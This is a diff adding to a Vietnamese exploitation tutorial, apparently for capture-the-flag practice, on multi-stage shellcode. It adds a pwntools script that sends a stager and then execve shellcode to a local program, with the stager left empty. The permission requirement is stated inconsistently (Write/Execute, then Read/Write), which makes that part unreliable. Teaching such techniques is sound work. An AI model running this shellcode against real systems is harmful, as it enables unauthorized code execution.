@@ -348,6 +348,8 @@ Khi các ràng buộc về kích thước hoặc ký tự cấm quá khắc nghi
 
 *   **Stage 1 (Stager/Egg Hunter):** Một đoạn shellcode cực ngắn, tối giản, được viết để vượt qua mọi filter. Nhiệm vụ duy nhất của nó là đọc một payload lớn hơn (Stage 2) từ một nguồn khác (network socket, stdin) vào một vùng nhớ có thể thực thi.
 
+    Điều kiện cốt lõi nhất vẫn là phải kiểm soát được vùng nhớ, trong kĩ thuật này chúng ta cần vùng nhớ có quyền **Ghi** và **Thực thi**. Đầu vào input của chương trình có thể ngặt nghèo, nhưng những vùng nhớ kề cạnh nơi input được lưu trữ nó phải đủ 2 quyền **Read** và **Write** thì mới có thể làm theo cách này được.
+
     Ví dụ về stager đọc từ `stdin` (fd=0) vào chính vị trí hiện tại (`rip`):
 
     ```asm
@@ -363,7 +365,56 @@ Khi các ràng buộc về kích thước hoặc ký tự cấm quá khắc nghi
     ```
     Payload này sẽ đọc Stage 2 từ `stdin` và ghi đè lên chính nó, sau đó CPU sẽ tiếp tục thực thi Stage 2.
 
+    > **Lưu ý**: Có thể sẽ có tình huống mà chương trình không cho phép nhận input đủ dài để cài đặt các thanh ghi như ý. Lúc đó ta sẽ cần dùng GDB để debug chương trình, xem chương trình gọi shellcode ở đoạn nào, ngay khi nhảy đến vùng để thực thi shellcode thì các thanh ghi của chương trình là gì. Từ đó tận dụng giá trị sẵn có của registers, thực hiện shellcode giai đoạn 1.
+
 *   **Stage 2 (Final Payload):** Shellcode hoàn chỉnh, không bị ràng buộc, thực hiện mục tiêu cuối cùng (gọi shell, đọc flag...).
+
+Dưới đây là đoạn code python mẫu để thực hiện kỹ thuật **Multi-Stage Shellcode**:
+
+**sender.py**
+```python
+from pwn import *
+
+context.arch = 'amd64'
+p = process('./program')
+
+# ==========================================
+# GIAI ĐOẠN 1:
+# ==========================================
+stage1 = asm("""
+    
+""")
+
+log.info(f"Gui Stage 1: {stage1.hex()}")
+p.send(stage1)
+
+# Tạm dừng 
+sleep(0.5)
+
+# ==========================================
+# GIAI ĐOẠN 2:
+# ==========================================
+
+# Đệm byte NOP vào để làm padding nếu cần.
+padding = asm("nop") * 1
+
+real_shellcode = asm("""
+    push 59
+    pop rax
+    push 0x61
+    push rsp
+    pop rdi
+    cdq
+    xor esi, esi
+    syscall
+""")
+
+stage2 = padding + real_shellcode
+log.info(f"Gui Stage 2 ({len(stage2)} bytes)...")
+p.send(stage2)
+
+p.interactive()
+```
 
 ### D. Tận Dụng Môi Trường Hệ Thống (Environment Preparation & Shellcode Golfing)
 
